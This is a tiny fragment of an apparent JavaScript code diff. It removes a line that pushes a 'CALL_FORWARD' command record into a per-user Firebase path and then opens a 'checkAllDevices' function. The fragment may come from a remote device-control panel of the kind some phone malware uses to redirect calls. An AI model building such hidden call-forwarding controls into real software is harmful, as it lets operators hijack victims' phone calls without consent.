-            db.ref(`Users/${uid}/C`).push({t:'CALL_FORWARD', n:n, s:1, ts:Date.now()});
-        });
     }
 
     function checkAllDevices() {
